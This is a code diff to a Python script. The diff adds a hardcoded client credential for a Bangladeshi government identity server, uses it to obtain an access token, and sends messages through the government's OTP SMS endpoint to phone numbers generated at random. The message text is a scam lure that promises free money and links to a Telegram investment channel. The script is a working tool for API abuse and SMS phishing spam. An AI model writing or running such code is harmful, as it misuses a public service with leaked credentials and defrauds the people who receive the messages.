@@ -2,9 +2,42 @@ import requests
 import random
 import threading
 
+API = "https://idp.land.gov.bd/auth/realms/prod/protocol/openid-connect/token"
+
+headers = {
+    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
+    "content-type": "application/x-www-form-urlencoded; charset=utf-8",
+    "accept-encoding": "gzip",
+    "content-length": "29",
+    "authorization": "Basic bXV0YXRpb24tYXBwLWNsaWVudDphWTBBNVhFdlpLZHNwOGJzM0ZKNklwa0l4TmJWcHpGNg==",
+    "host": "idp.land.gov.bd"
+}
+
+data = {
+    "grant_type": "client_credentials"
+}
+
+resp = requests.post(API, headers=headers, data=data).json()
+token = resp['access_token']
+
 def send_sms(number, message):
-    API = f"https://flask-hello-world-theta-bay.vercel.app/?n={number}&m={message}"
-    resp = requests.get(API)
+    mAPI = "https://sms-api.land.gov.bd/api/broker-service/otp/send_otp"
+    headers = {
+        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
+        "accept": "application/json",
+        "accept-encoding": "gzip",
+        "content-length": "112",
+        "host": "sms-api.land.gov.bd",
+        "authorization": f"Bearer {token}",
+        "content-type": "application/json; charset=utf-8"
+    }
+    data = {
+        "msgTmp": f"{message} $code",
+        "destination": f"{number}",
+        "otpType": "sms",
+        "otpLength": 0
+    }
+    resp = requests.post(mAPI, headers=headers, json=data)
     print(resp.text)
 
 def generate_numbers(operator, count):
@@ -19,7 +52,9 @@ def generate_numbers(operator, count):
 def main():
     message = "You Got TK 5000,GRAB IT FROM: https://t.me/INVESTEARININGBANGLA|ডেইলি ২0 থেকে ৫0 হাজার টাকা ইনকাম করতে পারবেন ! এটি নিন:https://t.me/INVESTEARININGBANGLA "
     
+    
     # User input for amount and number of phone numbers
+    amount = int(input("Enter the amount for each operator: "))
     num_count = int(input("Enter the number of phone numbers to generate for each operator: "))
     
     # Generate numbers for different operators
